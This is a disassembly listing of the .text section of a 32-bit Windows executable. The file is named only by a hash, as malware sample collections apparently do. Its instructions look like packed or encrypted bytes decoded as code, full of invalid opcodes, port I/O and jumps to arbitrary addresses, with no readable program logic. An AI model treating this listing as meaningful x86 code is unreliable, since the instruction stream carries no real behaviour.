
5f7b594f94e8ff3d0148639937f63124163c83aa556676bd291b3bca4b7254e9.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	and    DWORD PTR [eax-0x1dbe7cc0],eax
  411006:	call   0xab46880f
  41100b:	jecxz  0x41101d
  41100d:	mov    eax,ds:0xfcbc1ef8
  411012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411013:	inc    ecx
  411014:	pop    esi
  411015:	dec    edx
  411016:	push   edi
  411017:	cli    
  411018:	pop    edx
  411019:	and    edx,esi
  41101b:	mov    eax,0x17297550
  411020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411021:	adc    bl,BYTE PTR [ebx-0x5795b705]
  411027:	lahf   
  411028:	jp     0x41102a
  41102a:	clc    
  41102b:	cwde   
  41102c:	jno    0x410fee
  41102e:	and    ebx,DWORD PTR [edx+eiz*4+0x45]
  411032:	sbb    eax,0x68812ce4
  411037:	es jno 0x41103d
  41103a:	jno    0x410feb
  41103c:	add    DWORD PTR [ebx-0x16],edx
  41103f:	xor    ch,bl
  411041:	pop    ds
  411042:	in     eax,dx
  411043:	je     0x411026
  411045:	sbb    BYTE PTR [edi-0x244602a7],0x30
  41104c:	les    eax,FWORD PTR [ebp+0x2f9d71f8]
  411052:	mov    DWORD PTR [edx+0x3a],edi
  411055:	out    0x2c,al
  411057:	adc    DWORD PTR [ecx-0x21],esp
  41105a:	jmp    0x48b9:0xb59782d2
  411061:	push   ebx
  411062:	(bad)  
  411063:	dec    esi
  411064:	xor    eax,0x5b075eef
  411069:	mov    ebx,DWORD PTR [edx]
  41106b:	mov    esp,0x36ac15ef
  411070:	fst    DWORD PTR [edi-0x3d1fa2f6]
  411076:	fmulp  st(1),st
  411078:	clc    
  411079:	xor    bh,BYTE PTR [edx]
  41107b:	cmp    al,0x4d
  41107d:	xchg   ecx,eax
  41107e:	(bad)  [eax]
  411080:	call   DWORD PTR [ecx*1-0x7e695ad1]
  411087:	cmp    al,0x1b
  411089:	push   eax
  41108a:	xor    DWORD PTR [ebx+0x38],edi
  41108d:	adc    BYTE PTR [ecx+0x14],al
  411090:	mul    BYTE PTR [edi+eiz*8-0x12]
  411094:	gs clc 
  411096:	dec    esi
  411097:	mov    ecx,0xbe107487
  41109c:	ja     0x4110a8
  41109e:	leave  
  41109f:	and    al,0x22
  4110a1:	loop   0x411097
  4110a3:	lahf   
  4110a4:	scas   eax,DWORD PTR es:[edi]
  4110a5:	fwait
  4110a6:	add    DWORD PTR [ecx],eax
  4110a8:	jae    0x411107
  4110aa:	inc    edi
  4110ab:	jle    0x411052
  4110ad:	cwde   
  4110ae:	mov    eax,ds:0xc1d4c298
  4110b3:	lea    ecx,[edx+0x23]
  4110b6:	std    
  4110b7:	mov    al,ds:0x2d9bf8e4
  4110bc:	xchg   ecx,eax
  4110bd:	stos   BYTE PTR es:[edi],al
  4110be:	enter  0x1867,0xb5
  4110c2:	fidiv  WORD PTR [ebx-0x3aa451b7]
  4110c8:	mov    bl,bh
  4110ca:	icebp  
  4110cb:	mov    WORD PTR [ecx+0x18b51796],fs
  4110d1:	mov    edx,0x5206816c
  4110d6:	jle    0x41111d
  4110d8:	call   0x8124b745
  4110dd:	dec    esi
  4110de:	cmp    dl,al
  4110e0:	pop    esi
  4110e2:	sbb    edx,ecx
  4110e4:	rol    DWORD PTR [ebp-0x1892fd77],cl
  4110ea:	icebp  
  4110eb:	sbb    edx,DWORD PTR [esi-0x11]
  4110ee:	fs repz xchg esp,eax
  4110f1:	or     eax,0x2717be74
  4110f6:	out    0xd1,al
  4110f8:	push   edi
  4110f9:	out    dx,eax
  4110fa:	cdq    
  4110fb:	xor    cl,BYTE PTR [ecx-0x71]
  4110fe:	jae    0x4110b1
  411100:	cmp    al,0xf1
  411102:	cmp    esi,0x1f
  411105:	cmc    
  411106:	imul   BYTE PTR [eax+0x28]
  411109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41110a:	in     al,dx
  41110b:	retf   0x91a4
  41110e:	jns    0x4110f6
  411110:	dec    ecx
  411111:	and    eax,0xcbcb2618
  411116:	test   BYTE PTR [edi+0x11],ah
  411119:	loope  0x411119
  41111b:	or     al,0x99
  41111d:	xchg   BYTE PTR [eax-0x79],dh
  411120:	(bad)  
  411121:	cmp    eax,0xd36d0729
  411126:	and    al,0x45
  411128:	mov    dl,BYTE PTR [ebx]
  41112a:	cwde   
  41112b:	adc    ebx,esi
  41112d:	retf   
  41112e:	ss mov edx,0xbbeb0847
  411134:	and    cl,BYTE PTR [ebx+0x39]
  411137:	mov    al,cs:0x90eda401
  41113d:	fmulp  st(6),st
  41113f:	shl    BYTE PTR [ecx+0x3d8b6894],cl
  411145:	sbb    bl,BYTE PTR [eax+edi*2-0x5e1f7f4b]
  41114c:	jo     0x4110e3
  41114e:	std    
  41114f:	fbld   TBYTE PTR [ebp-0x10c5001e]
  411155:	push   ss
  411156:	fadd   st,st(6)
  411158:	je     0x4110f6
  41115a:	dec    ebp
  41115b:	add    esp,DWORD PTR [edx+0x15]
  41115e:	fadd   QWORD PTR [edi+esi*8-0x68]
  411162:	pop    ebx
  411163:	sbb    al,0xd2
  411165:	mov    ds:0x5b848f98,eax
  41116a:	dec    eax
  41116b:	daa    
  41116c:	aam    0xfe
  41116e:	aad    0x1d
  411170:	fild   WORD PTR ds:0xa1b27e6
  411176:	aad    0xeb
  411178:	sbb    bh,BYTE PTR [ebp+0x57]
  41117b:	inc    esi
  41117c:	stos   BYTE PTR es:[edi],al
  41117d:	push   esi
  41117e:	iret   
  41117f:	imul   edx,DWORD PTR [esi+0x29e1438c],0x34f32395
  411189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41118a:	xchg   ebx,eax
  41118b:	add    al,0xee
  41118d:	mov    bl,0xc7
  41118f:	jmp    0x4111d7
  411191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411192:	xchg   ecx,eax
  411193:	add    esp,edi
  411195:	pushf  
  411196:	sbb    al,0x89
  411198:	and    bh,0x6b
  41119b:	cmp    DWORD PTR [edi+0x4fe15785],esi
  4111a1:	inc    eax
  4111a2:	jne    0x411174
  4111a4:	or     DWORD PTR [edi],ebp
  4111a6:	in     eax,0xe1
  4111a8:	mov    ebp,0x6c6ec67
  4111ae:	adc    BYTE PTR [edx+0x10],ch
  4111b1:	cmp    dh,dl
  4111b3:	sub    BYTE PTR [ecx+0x1f6c66],0x77
  4111ba:	ret    
  4111bb:	ins    BYTE PTR es:[edi],dx
  4111bc:	inc    edx
  4111bd:	outs   dx,DWORD PTR ds:[esi]
  4111be:	jns    0x4111fc
  4111c0:	out    0xce,al
  4111c2:	pop    ebx
  4111c3:	stc    
  4111c4:	cld    
  4111c5:	inc    edx
  4111c6:	push   ebx
  4111c7:	jge    0x411241
  4111c9:	or     eax,0x61010408
  4111ce:	pop    esi
  4111cf:	dec    edi
  4111d0:	jns    0x41123d
  4111d2:	rcr    DWORD PTR [esi+eiz*1],cl
  4111d5:	mov    esp,0x8592b43
  4111da:	add    eax,0x5797f4f9
  4111df:	cli    
  4111e0:	xlat   BYTE PTR ds:[ebx]
  4111e1:	shl    DWORD PTR [esi+0x4eb567c8],1
  4111e7:	dec    esp
  4111e8:	mov    cl,0xd0
  4111ea:	jbe    0x411185
  4111ec:	cwde   
  4111ed:	imul   ecx
  4111ef:	push   0xffffff8f
  4111f1:	test   BYTE PTR [edx-0x7437c97a],al
  4111f7:	fist   WORD PTR [eax+0x77]
  4111fa:	outs   dx,BYTE PTR ds:[esi]
  4111fb:	xchg   esi,eax
  4111fc:	mov    WORD PTR [edi-0x729d7662],ds
  411202:	ret    
  411203:	pop    edi
  411204:	ds out 0xda,eax
  411207:	(bad)  
  411208:	stc    
  411209:	out    dx,eax
  41120a:	dec    edx
  41120b:	(bad)  [ecx-0xc]
  41120e:	aam    0x59
  411210:	aam    0xe4
  411212:	mov    WORD PTR [ebx+eiz*1+0x7aed5335],?
  411219:	int3   
  41121a:	in     eax,0xc4
  41121c:	scas   al,BYTE PTR es:[edi]
  41121d:	mov    esp,0xfb073a
  411222:	xor    ch,BYTE PTR [edi]
  411224:	mov    ch,0x83
  411226:	adc    DWORD PTR [ebx-0x66045d8c],esp
  41122c:	adc    DWORD PTR [eax],edi
  41122e:	or     ecx,DWORD PTR [ecx+0x5ae5296e]
  411234:	mov    dh,0x6c
  411236:	in     eax,0xc5
  411238:	sub    eax,0x4a908f6b
  41123d:	xor    eax,0x8d28ff2d
  411242:	cs cmp al,0xbc
  411245:	dec    eax
  411246:	push   ds
  411247:	in     eax,dx
  411248:	int3   
  411249:	(bad)  
  41124a:	sub    BYTE PTR [esi+0x1c2a524a],cl
  411250:	scas   eax,DWORD PTR es:[edi]
  411251:	aaa    
  411252:	pop    ds
  411253:	scas   eax,DWORD PTR es:[edi]
  411254:	movaps xmm6,xmm6
  411257:	sbb    BYTE PTR [ebx+ebp*8+0x30],ah
  41125b:	popf   
  41125c:	mov    eax,DWORD PTR [esi]
  41125e:	cmp    eax,0xb27d1dbb
  411263:	outs   dx,BYTE PTR ds:[esi]
  411264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411265:	dec    edx
  411266:	jp     0x411281
  411268:	ja     0x41126c
  41126a:	lock js 0x4112e7
  41126d:	shl    BYTE PTR [esi+0x50],1
  411270:	pop    esp
  411271:	sub    al,BYTE PTR [esi+0x43831cd6]
  411277:	sahf   
  411278:	sbb    al,0x7a
  41127a:	and    ebx,ebp
  41127c:	mov    cl,0x9a
  41127e:	lea    edi,[ebx+0x5c]
  411281:	fs into 
  411283:	loop   0x411296
  411285:	xlat   BYTE PTR ds:[ebx]
  411286:	push   edx
  411287:	pop    eax
  411288:	inc    eax
  411289:	sbb    ecx,DWORD PTR [edx-0x60]
  41128c:	add    edi,0x58
  41128f:	ins    DWORD PTR es:[edi],dx
  411290:	inc    eax
  411291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411293:	xchg   BYTE PTR [edx+eiz*8],al
  411296:	mov    WORD PTR [ebx],ds
  411298:	cmp    dl,BYTE PTR [esi]
  41129a:	mov    ?,WORD PTR [edi]
  41129c:	imul   esi,ebp,0x5a
  41129f:	add    esi,ebp
  4112a1:	xor    dl,BYTE PTR [bx+di]
  4112a4:	jecxz  0x41127c
  4112a6:	(bad)  
  4112a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a9:	adc    al,0x41
  4112ab:	inc    ebp
  4112ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ad:	int    0x13
  4112af:	lods   eax,DWORD PTR ds:[esi]
  4112b0:	push   ecx
  4112b1:	add    ebp,edx
  4112b3:	and    eax,0xbccde15d
  4112b8:	xor    ebp,DWORD PTR [ecx-0x45eb63db]
  4112be:	and    BYTE PTR ds:0x11c0c06a,ch
  4112c4:	ds xor eax,0x8a3a6d65
  4112ca:	stc    
  4112cb:	pop    ss
  4112cc:	repnz (bad) [ebx+esi*1]
  4112d0:	cdq    
  4112d1:	ret    
  4112d2:	test   BYTE PTR [eax+edx*2-0xd168998],0xc2
  4112da:	push   esp
  4112db:	push   eax
  4112dc:	or     BYTE PTR [ebp-0x5db34d31],bl
  4112e2:	sti    
  4112e3:	cmp    al,0x7f
  4112e5:	and    eax,0x716e4192
  4112ea:	sbb    esi,DWORD PTR ds:0x1aa80e56
  4112f0:	aad    0x83
  4112f2:	aaa    
  4112f3:	sub    DWORD PTR ds:0x990d2f13,eax
  4112f9:	jne    0x4112ae
  4112fb:	test   al,0xa1
  4112fd:	xchg   edi,eax
  4112fe:	mov    DWORD PTR [edi+0x4b],ecx
  411301:	call   0x3dd1:0xeca8797e
  411308:	xor    al,0x6d
  41130a:	cmp    eax,0x4e993a10
  41130f:	icebp  
  411310:	sub    eax,0x32c42848
  411315:	inc    ebx
  411316:	cmp    dh,BYTE PTR [edi+0x2c]
  411319:	outs   dx,BYTE PTR ds:[esi]
  41131a:	repz jecxz 0x4112e2
  41131d:	push   esp
  41131e:	retf   0x6581
  411321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411322:	sub    DWORD PTR [edi+0x302323fb],eax
  411328:	sub    al,0x56
  41132a:	pop    ecx
  41132b:	jno    0x411323
  41132d:	sahf   
  41132e:	push   eax
  41132f:	sbb    eax,0x82dddfff
  411334:	pop    es
  411335:	mov    edi,DWORD PTR [ecx]
  411337:	mov    ds:0x68eac94d,al
  41133c:	ret    
  41133d:	inc    ebp
  41133e:	aaa    
  41133f:	sti    
  411340:	mov    ecx,0xc9f5869b
  411345:	fmul   DWORD PTR [ebx+edx*4-0x1a]
  411349:	ds popf 
  41134b:	or     DWORD PTR [eax],edx
  41134d:	iret   
  41134e:	pop    eax
  41134f:	fbld   TBYTE PTR [ebx]
  411351:	fisubr WORD PTR [eax+0x28]
  411354:	xchg   ecx,eax
  411355:	adc    dh,BYTE PTR [esi-0x8fdc41d]
  41135b:	ret    0x42c5
  41135e:	sub    BYTE PTR [esp+ebx*4],al
  411361:	add    al,0xb7
  411363:	xchg   ebx,eax
  411364:	dec    edi
  411365:	les    eax,FWORD PTR [edi-0x36]
  411368:	retf   0xb88e
  41136b:	mov    ah,0xd7
  41136d:	and    ch,BYTE PTR [ecx-0x5]
  411370:	test   al,0x73
  411372:	jl     0x4113d6
  411374:	adc    al,BYTE PTR [esi+0x245ee744]
  41137a:	test   al,0x49
  41137c:	adc    DWORD PTR [ebx+0x5d],edx
  41137f:	cli    
  411380:	mov    edx,0xade4712
  411385:	push   edx
  411386:	leave  
  411387:	mov    edi,0x64e4b9f9
  41138c:	dec    esi
  41138d:	test   DWORD PTR [ebx-0x5f26972e],ebp
  411393:	(bad)  
  411394:	cmp    cl,dl
  411396:	inc    ebx
  411397:	and    ch,BYTE PTR [edi+0x5574be52]
  41139d:	cmp    DWORD PTR fs:[edi+0x2c],0xffffff83
  4113a2:	into   
  4113a3:	jecxz  0x411391
  4113a5:	sbb    ecx,DWORD PTR [esi+0x48]
  4113a8:	addr16 pop edi
  4113aa:	lahf   
  4113ab:	add    BYTE PTR [edi+0x12],ah
  4113ae:	popa   
  4113af:	push   es
  4113b0:	cmp    al,0x1a
  4113b2:	jo     0x41142e
  4113b4:	cwde   
  4113b5:	stos   DWORD PTR es:[edi],eax
  4113b6:	dec    edx
  4113b7:	xlat   BYTE PTR ds:[ebx]
  4113b8:	mov    eax,ds:0x5d1979f7
  4113bd:	xchg   ebp,eax
  4113be:	cli    
  4113bf:	ja     0x411384
  4113c1:	push   es
  4113c2:	stos   BYTE PTR es:[edi],al
  4113c3:	mov    esi,0x78d00775
  4113c8:	scas   eax,DWORD PTR es:[edi]
  4113c9:	aam    0x48
  4113cb:	inc    esp
  4113cc:	je     0x411357
  4113ce:	out    0x85,al
  4113d0:	scas   al,BYTE PTR es:[edi]
  4113d1:	dec    ebx
  4113d2:	test   DWORD PTR [ebp+0x1c],eax
  4113d5:	test   al,0xc7
  4113d7:	loop   0x41136f
  4113d9:	xchg   esp,eax
  4113da:	add    al,0x19
  4113dc:	inc    ecx
  4113dd:	(bad)  
  4113de:	jb     0x4113b3
  4113e0:	inc    esp
  4113e1:	ret    0x756e
  4113e4:	dec    esi
  4113e5:	xor    BYTE PTR [edi+0x37],ch
  4113e8:	stc    
  4113e9:	imul   ebp,DWORD PTR [edx-0x41c327f],0x16546e39
  4113f3:	mov    cl,0x1a
  4113f5:	and    al,0xb8
  4113f7:	outs   dx,DWORD PTR ds:[esi]
  4113f8:	repz inc esi
  4113fa:	loope  0x4113dd
  4113fc:	xlat   BYTE PTR ds:[ebx]
  4113fd:	or     DWORD PTR [esi+0x3f],ebp
  411400:	sub    eax,0x70b1e65c
  411405:	in     al,dx
  411406:	xchg   bl,ah
  411408:	test   eax,0xeb97ee4a
  41140d:	jno    0x4113b4
  41140f:	imul   ecx,DWORD PTR [eax*4+0x297e42ad],0xffffff84
  411417:	xchg   edx,eax
  411418:	dec    ebx
  411419:	jmp    0xd7a8:0x49519440
  411420:	jmp    0x57499d59
  411425:	gs aam 0x21
  411428:	mov    DWORD PTR [edi+0x76ff6031],edi
  41142e:	cmc    
  41142f:	lds    edx,FWORD PTR [edx]
  411431:	icebp  
  411432:	jnp    0x41147a
  411434:	pop    ebp
  411435:	pop    ebp
  411436:	jmp    0x84ad:0x83f45108
  41143d:	sub    edi,eax
  41143f:	sahf   
  411440:	jb     0x411427
  411442:	pushf  
  411443:	stos   BYTE PTR es:[edi],al
  411444:	imul   ebp,DWORD PTR [edx-0x6342b056],0x70
  41144b:	(bad)  
  41144c:	xchg   edi,eax
  41144d:	add    eax,0xaca699d2
  411452:	je     0x4113d8
  411454:	call   0x782:0x3aa83d4f
  41145b:	mov    bh,BYTE PTR [ebp+0x68]
  41145e:	sub    BYTE PTR [eax-0x720fc8a0],0x16
  411465:	and    bl,BYTE PTR [edi-0x11]
  411468:	ret    0x83dd
  41146b:	stos   DWORD PTR es:[edi],eax
  41146c:	push   es
  41146d:	icebp  
  41146e:	pop    ebp
  41146f:	inc    esp
  411470:	push   es
  411471:	xlat   BYTE PTR ds:[ebx]
  411472:	sbb    ax,0x44bd
  411476:	sti    
  411477:	aam    0xe4
  411479:	clc    
  41147a:	fcomp  QWORD PTR [esi]
  41147c:	adc    al,0xa4
  41147e:	xor    eax,0x16f79eee
  411483:	repz adc al,0xa3
  411486:	pop    edx
  411487:	retf   
  411488:	inc    edi
  411489:	xchg   cl,ah
  41148b:	retf   0xb6de
  41148e:	ds hlt 
  411490:	xchg   ebp,eax
  411491:	fidiv  WORD PTR [ecx+0x33]
  411494:	pop    ebx
  411495:	sbb    eax,esp
  411497:	fimul  DWORD PTR [esp+ecx*8-0xd2ad5ba]
  41149e:	pop    edi
  41149f:	pop    ebx
  4114a0:	mov    edi,DWORD PTR fs:[edx]
  4114a3:	lods   eax,DWORD PTR ds:[esi]
  4114a4:	inc    eax
  4114a5:	js     0x4114e5
  4114a7:	sbb    DWORD PTR [esi-0xcb9ec0c],0xc79f6469
  4114b1:	scas   al,BYTE PTR es:[edi]
  4114b2:	lock add eax,0x17b6079c
  4114b8:	sub    BYTE PTR [edx-0x1215b588],ch
  4114be:	xlat   BYTE PTR ds:[ebx]
  4114bf:	pop    edx
  4114c0:	pop    ebp
  4114c1:	push   0x70
  4114c3:	cmp    ah,cl
  4114c5:	ins    BYTE PTR es:[edi],dx
  4114c6:	sub    al,0x7d
  4114c8:	imul   ebx,DWORD PTR [edi],0xce8404ef
  4114ce:	stc    
  4114cf:	xchg   edx,eax
  4114d0:	inc    ebp
  4114d1:	not    dl
  4114d3:	jne    0x411552
  4114d5:	inc    ebp
  4114d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d7:	(bad)  
  4114d8:	push   edi
  4114d9:	mov    DWORD PTR [edi+0x33],0xc78d66df
  4114e0:	sub    BYTE PTR [eax-0x34057f5c],bh
  4114e6:	fsub   DWORD PTR [ecx+0x35805e26]
  4114ec:	or     ecx,edx
  4114ee:	lock mov bh,BYTE PTR [esi]
  4114f1:	cmp    cl,ah
  4114f3:	sbb    BYTE PTR [ebx],al
  4114f5:	cli    
  4114f6:	push   ds
  4114f7:	fidiv  WORD PTR [esi-0x496b864]
  4114fd:	inc    edi
  4114fe:	aad    0xf8
  411500:	fldcw  WORD PTR [edx+ebx*4]
  411503:	fnstcw WORD PTR [edi+0x522a2e4e]
  411509:	je     0x4114d6
  41150b:	lea    ebx,[ebp+ecx*8-0x6642a964]
  411512:	xchg   esi,eax
  411513:	pop    edx
  411514:	add    BYTE PTR [ebp-0x6a97cd19],dl
  41151a:	jle    0x411532
  41151c:	in     al,dx
  41151d:	adc    al,0xe8
  41151f:	push   cs
  411520:	jle    0x4114a7
  411522:	push   eax
  411523:	xor    DWORD PTR [esi-0x5ea764f0],esi
  411529:	das    
  41152a:	fcom   QWORD PTR [edi]
  41152c:	stos   DWORD PTR es:[edi],eax
  41152d:	rcr    DWORD PTR [ebx+0x267f9b47],cl
  411533:	aaa    
  411534:	jno    0x41155f
  411536:	jb     0x4114ef
  411538:	mov    BYTE PTR [eax+0x554e978e],bh
  41153e:	repnz ss ins BYTE PTR es:[edi],dx
  411541:	(bad)  
  411542:	repnz add bh,BYTE PTR [ecx+0x11]
  411546:	xchg   esp,eax
  411547:	mov    eax,0x4c972a61
  41154c:	arpl   ax,di
  41154e:	loope  0x4114dc
  411550:	ins    DWORD PTR es:[edi],dx
  411551:	xchg   DWORD PTR [esi],ebp
  411553:	jno    0x411515
  411555:	inc    esp
  411556:	ins    BYTE PTR es:[edi],dx
  411557:	xor    dh,0x19
  41155a:	xchg   cx,ax
  41155c:	(bad)  
  41155d:	stc    
  41155e:	fadd   st,st(5)
  411560:	mov    edi,0xfbdf8b70
  411565:	ret    0xb5b1
  411568:	fldcw  WORD PTR [ecx+0x8]
  41156b:	in     eax,0x48
  41156d:	jecxz  0x4115e5
  41156f:	xchg   ebx,eax
  411570:	jl     0x4115c8
  411572:	ficomp DWORD PTR [edx]
  411574:	jno    0x411587
  411576:	je     0x411551
  411578:	fnstcw WORD PTR [eax-0x202f090b]
  41157e:	(bad)  
  41157f:	pop    esp
  411580:	outs   dx,BYTE PTR ds:[esi]
  411581:	add    DWORD PTR [eax],ebp
  411583:	test   BYTE PTR [ebx],0x9e
  411586:	test   al,0xa9
  411588:	aad    0xa2
  41158a:	and    edx,DWORD PTR ds:0xd7ac07c3
  411590:	jle    0x4115b9
  411592:	sbb    al,0x7f
  411594:	xor    cl,ch
  411596:	xor    al,ch
  411598:	cmp    esi,DWORD PTR [edi+0x6]
  41159b:	cmp    al,0x42
  41159d:	mov    ah,0x9
  41159f:	add    bl,dl
  4115a1:	ret    0x5ba8
  4115a4:	jg     0x411527
  4115a6:	and    al,0x18
  4115a8:	jmp    DWORD PTR [ecx+0x55]
  4115ab:	jg     0x411616
  4115ad:	jl     0x411590
  4115af:	cwde   
  4115b0:	mov    WORD PTR [edi+0x5f],gs
  4115b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b4:	je     0x411626
  4115b6:	and    DWORD PTR [edx+esi*1],0x5e
  4115ba:	es jge 0x411549
  4115bd:	rol    dl,0x7b
  4115c0:	add    DWORD PTR [esi],esi
  4115c2:	fist   WORD PTR [ebp+0x53]
  4115c5:	aaa    
  4115c6:	imul   ebx,DWORD PTR [ebp+0x633485cd],0x54e4e957
  4115d0:	scas   al,BYTE PTR es:[edi]
  4115d1:	sub    ecx,edi
  4115d3:	data16 mov ds:0x5eb9680b,al
  4115d9:	lds    eax,FWORD PTR [ebx+0x2e294b5b]
  4115df:	mov    ecx,0xa1c7536e
  4115e4:	mov    eax,ds:0x95674575
  4115e9:	pop    ecx
  4115ea:	push   cs
  4115eb:	in     eax,0x43
  4115ed:	outs   dx,DWORD PTR ds:[esi]
  4115ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ef:	mov    ecx,0xbe671e7b
  4115f4:	call   0x502c1b0b
  4115f9:	and    eax,0x953405a8
  4115fe:	jb     0x411622
  411600:	push   edx
  411601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411602:	add    al,0x24
  411604:	mov    ch,al
  411606:	pusha  
  411607:	add    BYTE PTR [ebx],0xbd
  41160a:	pop    edx
  41160b:	cmp    al,0x5a
  41160d:	push   eax
  41160e:	inc    ecx
  41160f:	scas   eax,DWORD PTR es:[edi]
  411610:	loope  0x41165b
  411612:	scas   al,BYTE PTR es:[edi]
  411613:	stos   BYTE PTR es:[edi],al
  411614:	aas    
  411615:	lock aad 0x3a
  411618:	cs clc 
  41161a:	pushf  
  41161b:	inc    esp
  41161c:	xchg   ebx,eax
  41161d:	pop    edx
  41161e:	jo     0x4115f5
  411620:	inc    edx
  411621:	jns    0x411619
  411623:	mov    ecx,0xa2b5dc0
  411628:	push   eax
  411629:	clc    
  41162a:	push   eax
  41162b:	lea    edi,[edx+0xe]
  41162e:	stos   DWORD PTR es:[edi],eax
  41162f:	pop    edx
  411630:	pop    es
  411631:	stos   DWORD PTR es:[edi],eax
  411632:	adc    eax,0x1023f76c
  411637:	xchg   ebp,eax
  411638:	nop
  411639:	pop    esi
  41163a:	mov    edi,DWORD PTR [eax]
  41163c:	push   esp
  41163d:	dec    eax
  41163e:	retf   0x4864
  411641:	inc    ecx
  411642:	in     al,dx
  411643:	adc    ch,dl
  411645:	add    al,0x2d
  411647:	mov    ebx,DWORD PTR [ecx+0x28368fca]
  41164d:	push   esi
  41164e:	ds inc esp
  411650:	jp     0x411627
  411652:	cwde   
  411653:	add    BYTE PTR [eax-0x3ba55586],bl
  411659:	sub    ebp,DWORD PTR [eax-0x6a]
  41165c:	ret    0x85b4
  41165f:	ror    BYTE PTR es:[edx],cl
  411662:	ret    0x572f
  411665:	jno    0x4116a4
  411667:	test   BYTE PTR [edx+ebp*2-0x1c5c7f98],dh
  41166e:	or     al,BYTE PTR [ecx]
  411670:	ficom  WORD PTR [eax+0x115ff7de]
  411676:	pop    ds
  411677:	sbb    BYTE PTR [ebx+0x2aa97bf4],bl
  41167d:	out    dx,eax
  41167e:	cmp    eax,0x591d8607
  411683:	fidiv  DWORD PTR [ebx+0xf00a2e2]
  411689:	retf   0x670b
  41168c:	into   
  41168d:	fadd   DWORD PTR [ebx+ecx*8+0x1635078c]
  411694:	imul   edi,DWORD PTR [ebx-0x5aa2d74c],0xffffff9e
  41169b:	jp     0x41170d
  41169d:	cmp    al,0x51
  41169f:	fs (bad) 
  4116a1:	jp     0x41164f
  4116a3:	outs   dx,BYTE PTR ds:[esi]
  4116a4:	leave  
  4116a5:	pop    esi
  4116a6:	add    eax,DWORD PTR [ebp+0x54bdf00]
  4116ac:	mov    DWORD PTR [ebx],esp
  4116ae:	mov    edi,0x2cd1542e
  4116b3:	sub    bl,BYTE PTR [eax]
  4116b5:	xor    eax,0xa52b3a19
  4116ba:	pop    ebx
  4116bb:	dec    esp
  4116bc:	inc    edx
  4116bd:	inc    edx
  4116be:	inc    ebp
  4116bf:	sub    al,0xaa
  4116c1:	int3   
  4116c2:	outs   dx,BYTE PTR ds:[esi]
  4116c3:	sti    
  4116c4:	jg     0x4116b0
  4116c6:	push   ebp
  4116c7:	xchg   edi,eax
  4116c8:	test   eax,0x67894cff
  4116cd:	mov    eax,0xbe601d7a
  4116d2:	and    eax,0x161eb41a
  4116d7:	ins    DWORD PTR es:[edi],dx
  4116d8:	call   0xef05:0x2c081912
  4116df:	mov    ecx,0xd7284463
  4116e4:	mov    WORD PTR [esi],gs
  4116e6:	or     eax,0x156ad809
  4116eb:	or     bl,BYTE PTR [edx+0x3b]
  4116ee:	test   edx,edi
  4116f0:	adc    ebx,DWORD PTR [ebp-0x6b8484f2]
  4116f6:	dec    eax
  4116f7:	sbb    eax,0x4176c77b
  4116fc:	mov    al,ds:0x6eac8280
  411701:	or     eax,0xfaa1dc10
  411706:	and    BYTE PTR [esi+esi*2],ah
  411709:	sub    eax,0x1000e526
  41170e:	ins    BYTE PTR es:[edi],dx
  41170f:	stos   DWORD PTR es:[edi],eax
  411710:	out    0xd5,eax
  411712:	jg     0x41174a
  411714:	mov    ebp,0x9bfde4f5
  411719:	xor    eax,0xd59f9da
  41171e:	in     eax,0x90
  411720:	adc    al,dh
  411722:	sub    eax,0x7c328cd8
  411727:	mov    eax,ds:0x5a4e6494
  41172c:	data16 jg 0x411752
  41172f:	cmp    esi,ebp
  411731:	inc    esp
  411732:	imul   esi,edx,0x5953ad36
  411738:	push   cs
  411739:	xor    al,0xd8
  41173b:	dec    ebx
  41173c:	iret   
  41173d:	ins    DWORD PTR es:[edi],dx
  41173e:	fldenv [esi]
  411740:	cmp    DWORD PTR [ebx],ebp
  411742:	mov    cl,0x0
  411744:	jmp    0x411715
  411746:	dec    esp
  411747:	mov    fs,WORD PTR [ecx-0x3a4acbd2]
  41174d:	fwait
  41174e:	add    BYTE PTR [ecx-0x29],0x54
  411752:	jae    0x4117c2
  411754:	out    0x1d,eax
  411756:	icebp  
  411757:	mov    bh,0x90
  411759:	dec    ebx
  41175a:	(bad)  
  41175c:	push   es
  41175d:	cmp    DWORD PTR [edx],edx
  41175f:	inc    edi
  411760:	push   ebp
  411761:	call   0x65939389
  411766:	fwait
  411767:	or     al,0xf
  411769:	xchg   ebx,eax
  41176a:	mov    ebx,0x51d16e86
  41176f:	je     0x411794
  411771:	jb     0x411736
  411773:	test   eax,0xc1f77d22
  411778:	and    al,0x85
  41177a:	add    eax,0x89b0ccd2
  41177f:	lea    ebx,[edx-0x58]
  411782:	test   al,0x77
  411784:	push   0xb466f902
  411789:	aas    
  41178a:	sbb    eax,0xcbe43520
  41178f:	mov    edx,0x5b2f0060
  411794:	icebp  
  411795:	and    BYTE PTR [ecx-0x2d],0x52
  411799:	or     al,0x5e
  41179b:	sahf   
  41179c:	adc    ebp,DWORD PTR [esp+ebp*8-0x67d7f823]
  4117a3:	sub    eax,0x704750e
  4117a8:	mov    esi,0x5cff8d7f
  4117ad:	(bad)  
  4117ae:	les    esp,FWORD PTR [ebx+0x2c]
  4117b1:	retf   
  4117b2:	dec    eax
  4117b3:	loope  0x4117bf
  4117b5:	loope  0x4117d8
  4117b7:	or     DWORD PTR [eax+0x4f7a0036],ebx
  4117bd:	(bad)  
  4117bf:	int3   
  4117c0:	aad    0xb
  4117c2:	jns    0x411781
  4117c4:	popa   
  4117c5:	lods   al,BYTE PTR ds:[esi]
  4117c6:	rcr    DWORD PTR [eax+eax*2-0x43],0x8f
